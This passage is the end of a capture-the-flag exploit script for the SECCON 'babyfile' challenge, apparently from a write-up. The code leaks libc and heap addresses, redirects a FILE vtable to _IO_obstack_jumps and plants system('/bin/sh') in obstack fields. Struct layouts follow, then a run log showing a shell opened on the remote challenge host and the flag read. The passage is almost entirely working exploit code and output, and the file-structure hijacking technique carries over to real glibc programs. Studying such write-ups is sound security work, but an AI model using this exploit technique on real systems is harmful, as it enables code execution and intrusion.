    leak = pwn.u64(io.recv(8).ljust(8, b"\x00")) - 0x2160c0 + 0x2d160
    pwn.log.info(f"libc: {hex(leak)}")
    libc.address = leak

    leak_main_arena = leak + 0x1ed5a0

    heap = leak_ptr(pwn.p64(leak_main_arena)) - 0x2a0
    pwn.log.info(f"heap: {hex(heap)}")

    _IO_obstack_jumps = leak + 0x1E9260
    pwn.log.info(f"_IO_obstack_jumps: {hex(_IO_obstack_jumps)}")

    # edit vtable => _IO_obstack_jumps
    write_ptr(pwn.p64(_IO_obstack_jumps - 8 * 9), File.vtable)
    write_ptr(pwn.p64(heap + 0x2a0), File.obstack)

    partial_write(pwn.p8(0xff), File._IO_read_base)

    write_ptr(pwn.p64(libc.sym.system), obstack.chunkfun) # fn ptr, system
    write_ptr(pwn.p64(next(libc.search(b'/bin/sh'))), obstack.extra_arg) # arg
    partial_write(pwn.p8(True), obstack.use_extra_arg)

    fflush()
    # system("/bin/sh")

    io.sendline(b"cat flag-f81d1f481db83712a1128dc9b72d5503.txt")
    io.interactive()

if __name__ == "__main__":
    main()

"""
type = struct _IO_FILE {
/*      0      |       4 */    int _flags;
/* XXX  4-byte hole      */
/*      8      |       8 */    char *_IO_read_ptr;
/*     16      |       8 */    char *_IO_read_end;
/*     24      |       8 */    char *_IO_read_base;
/*     32      |       8 */    char *_IO_write_base;
/*     40      |       8 */    char *_IO_write_ptr;
/*     48      |       8 */    char *_IO_write_end;
/*     56      |       8 */    char *_IO_buf_base;
/*     64      |       8 */    char *_IO_buf_end;
/*     72      |       8 */    char *_IO_save_base;
/*     80      |       8 */    char *_IO_backup_base;
/*     88      |       8 */    char *_IO_save_end;
/*     96      |       8 */    struct _IO_marker *_markers;
/*    104      |       8 */    struct _IO_FILE *_chain;
/*    112      |       4 */    int _fileno;
/*    116      |       4 */    int _flags2;
/*    120      |       8 */    __off_t _old_offset;
/*    128      |       2 */    unsigned short _cur_column;
/*    130      |       1 */    signed char _vtable_offset;
/*    131      |       1 */    char _shortbuf[1];
/* XXX  4-byte hole      */
/*    136      |       8 */    _IO_lock_t *_lock;
/*    144      |       8 */    __off64_t _offset;
/*    152      |       8 */    struct _IO_codecvt *_codecvt;
/*    160      |       8 */    struct _IO_wide_data *_wide_data;
/*    168      |       8 */    struct _IO_FILE *_freeres_list;
/*    176      |       8 */    void *_freeres_buf;
/*    184      |       8 */    size_t __pad5;
/*    192      |       4 */    int _mode;
/*    196      |      20 */    char _unused2[20];

                               /* total size (bytes):  216 */
                             }

struct obstack          /* control current object in current chunk */
{
  long chunk_size;              /* preferred size to allocate chunks in */
  struct _obstack_chunk *chunk; /* address of current struct obstack_chunk */
  char *object_base;            /* address of object we are building */
  char *next_free;              /* where to add next char to current object */
  char *chunk_limit;            /* address of char after current chunk */
  union
  {
    PTR_INT_TYPE tempint;
    void *tempptr;
  } temp;                       /* Temporary for some macros.  */
  int alignment_mask;           /* Mask of alignment for each object. */
  /* These prototypes vary based on 'use_extra_arg', and we use
     casts to the prototypeless function type in all assignments,
     but having prototypes here quiets -Wstrict-prototypes.  */
  struct _obstack_chunk *(*chunkfun) (void *, long);
  void (*freefun) (void *, struct _obstack_chunk *);
  void *extra_arg;              /* first arg for chunk alloc/dealloc funcs */
  unsigned use_extra_arg : 1;     /* chunk alloc/dealloc funcs take extra arg */
  unsigned maybe_empty_object : 1; /* There is a possibility that the current
				      chunk contains a zero-length object.  This
				      prevents freeing the chunk if we allocate
				      a bigger chunk to replace it. */
  unsigned alloc_failed : 1;      /* No longer used, as we now call the failed
				     handler on error, but retained for binary
				     compatibility.  */
};

nasm@off:~/Documents/pwn/seccon/babyfile$ time python3 exploit.py REMOTE HOST=babyfile.seccon.games PORT=3157
[*] '/home/nasm/Documents/pwn/seccon/babyfile/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/nasm/Documents/pwn/seccon/babyfile/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to babyfile.seccon.games on port 3157: Done
[*] libc: 0x7fe2bc538000
[*] heap: 0x55fd27776000
[*] _IO_obstack_jumps: 0x7fe2bc721260
[*] Switching to interactive mode
SECCON{r34d_4nd_wr173_4nywh3r3_w17h_f1l3_57ruc7ur3}
[*] Got EOF while reading in interactive
$
"""
```
{{< /expand >}}
